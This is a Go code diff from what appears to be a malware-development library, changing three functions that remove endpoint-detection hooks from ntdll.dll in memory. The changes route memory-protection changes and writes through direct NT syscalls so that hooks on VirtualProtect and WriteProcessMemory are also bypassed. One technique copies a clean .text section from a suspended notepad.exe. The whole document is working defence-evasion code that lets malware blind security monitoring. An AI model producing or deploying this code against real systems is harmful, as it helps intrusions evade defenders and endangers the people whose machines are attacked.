@@ -24,6 +24,7 @@ import (
 	"golang.org/x/sys/windows"
 
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
 // ClassicUnhook restores the first 5 bytes of a hooked ntdll function
@@ -31,7 +32,7 @@ import (
 //
 // This works because the on-disk ntdll is never hooked — EDR hooks are
 // applied in-memory after the DLL is loaded.
-func ClassicUnhook(funcName string) error {
+func ClassicUnhook(funcName string, caller *wsyscall.Caller) error {
 	sysDir, _ := windows.GetSystemDirectory()
 	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
 
@@ -59,12 +60,12 @@ func ClassicUnhook(funcName string) error {
 	}
 
 	// Overwrite the hooked bytes with the clean ones
-	return api.PatchMemory(proc.Addr(), freshBytes)
+	return api.PatchMemoryWithCaller(proc.Addr(), freshBytes, caller)
 }
 
 // FullUnhook replaces the entire .text section of the loaded ntdll.dll
 // with the clean version from disk. This removes ALL hooks at once.
-func FullUnhook() error {
+func FullUnhook(caller *wsyscall.Caller) error {
 	sysDir, _ := windows.GetSystemDirectory()
 	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
 
@@ -103,17 +104,58 @@ func FullUnhook() error {
 	textSize := uintptr(len(freshText))
 
 	var oldProtect uint32
-	if err := windows.VirtualProtect(textAddr, textSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
-		return fmt.Errorf("VirtualProtect .text: %w", err)
-	}
+	if caller != nil {
+		// Route through NT syscalls to bypass potential hooks on VirtualProtect/WriteProcessMemory.
+		process := uintptr(0xFFFFFFFFFFFFFFFF) // current process pseudo-handle
+		baseAddr := textAddr
+		regionSize := textSize
+		r, err := caller.Call("NtProtectVirtualMemory",
+			process,
+			uintptr(unsafe.Pointer(&baseAddr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			uintptr(windows.PAGE_EXECUTE_READWRITE),
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+		if r != 0 {
+			return fmt.Errorf("NtProtectVirtualMemory .text: %w", err)
+		}
 
-	var written uintptr
-	currentProcess, _ := windows.GetCurrentProcess()
-	if err := windows.WriteProcessMemory(currentProcess, textAddr, &freshText[0], textSize, &written); err != nil {
-		return fmt.Errorf("WriteProcessMemory .text: %w", err)
-	}
+		var written uintptr
+		r, err = caller.Call("NtWriteVirtualMemory",
+			process,
+			textAddr,
+			uintptr(unsafe.Pointer(&freshText[0])),
+			textSize,
+			uintptr(unsafe.Pointer(&written)),
+		)
+		if r != 0 {
+			return fmt.Errorf("NtWriteVirtualMemory .text: %w", err)
+		}
 
-	windows.VirtualProtect(textAddr, textSize, oldProtect, &oldProtect)
+		// Restore original protection.
+		baseAddr = textAddr
+		regionSize = textSize
+		var dummy uint32
+		caller.Call("NtProtectVirtualMemory",
+			process,
+			uintptr(unsafe.Pointer(&baseAddr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			uintptr(oldProtect),
+			uintptr(unsafe.Pointer(&dummy)),
+		)
+	} else {
+		if err := windows.VirtualProtect(textAddr, textSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
+			return fmt.Errorf("VirtualProtect .text: %w", err)
+		}
+
+		var written uintptr
+		currentProcess, _ := windows.GetCurrentProcess()
+		if err := windows.WriteProcessMemory(currentProcess, textAddr, &freshText[0], textSize, &written); err != nil {
+			return fmt.Errorf("WriteProcessMemory .text: %w", err)
+		}
+
+		windows.VirtualProtect(textAddr, textSize, oldProtect, &oldProtect)
+	}
 	return nil
 }
 
@@ -126,7 +168,7 @@ func FullUnhook() error {
 //  2. Read the ntdll.dll .text section from the child process memory
 //  3. Overwrite our hooked .text section with the clean copy
 //  4. Terminate the child process
-func PerunUnhook() error {
+func PerunUnhook(caller *wsyscall.Caller) error {
 	// Spawn notepad.exe suspended
 	sysDir, _ := windows.GetSystemDirectory()
 	notepadPath, _ := windows.UTF16PtrFromString(filepath.Join(sysDir, "notepad.exe"))
@@ -198,17 +240,56 @@ func PerunUnhook() error {
 	// Overwrite our hooked .text with the clean copy
 	localTextAddr := localBase + uintptr(textVA)
 	var oldProtect uint32
-	if err := windows.VirtualProtect(localTextAddr, uintptr(textSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
-		return fmt.Errorf("VirtualProtect .text: %w", err)
-	}
+	if caller != nil {
+		process := uintptr(0xFFFFFFFFFFFFFFFF)
+		baseAddr := localTextAddr
+		regionSize := uintptr(textSize)
+		r, err := caller.Call("NtProtectVirtualMemory",
+			process,
+			uintptr(unsafe.Pointer(&baseAddr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			uintptr(windows.PAGE_EXECUTE_READWRITE),
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+		if r != 0 {
+			return fmt.Errorf("NtProtectVirtualMemory .text: %w", err)
+		}
 
-	var written uintptr
-	currentProcess, _ := windows.GetCurrentProcess()
-	if err := windows.WriteProcessMemory(currentProcess, localTextAddr, &cleanText[0], uintptr(textSize), &written); err != nil {
-		return fmt.Errorf("WriteProcessMemory .text: %w", err)
-	}
+		var written uintptr
+		r, err = caller.Call("NtWriteVirtualMemory",
+			process,
+			localTextAddr,
+			uintptr(unsafe.Pointer(&cleanText[0])),
+			uintptr(textSize),
+			uintptr(unsafe.Pointer(&written)),
+		)
+		if r != 0 {
+			return fmt.Errorf("NtWriteVirtualMemory .text: %w", err)
+		}
 
-	windows.VirtualProtect(localTextAddr, uintptr(textSize), oldProtect, &oldProtect)
+		baseAddr = localTextAddr
+		regionSize = uintptr(textSize)
+		var dummy uint32
+		caller.Call("NtProtectVirtualMemory",
+			process,
+			uintptr(unsafe.Pointer(&baseAddr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			uintptr(oldProtect),
+			uintptr(unsafe.Pointer(&dummy)),
+		)
+	} else {
+		if err := windows.VirtualProtect(localTextAddr, uintptr(textSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
+			return fmt.Errorf("VirtualProtect .text: %w", err)
+		}
+
+		var written uintptr
+		currentProcess, _ := windows.GetCurrentProcess()
+		if err := windows.WriteProcessMemory(currentProcess, localTextAddr, &cleanText[0], uintptr(textSize), &written); err != nil {
+			return fmt.Errorf("WriteProcessMemory .text: %w", err)
+		}
+
+		windows.VirtualProtect(localTextAddr, uintptr(textSize), oldProtect, &oldProtect)
+	}
 	return nil
 }
 
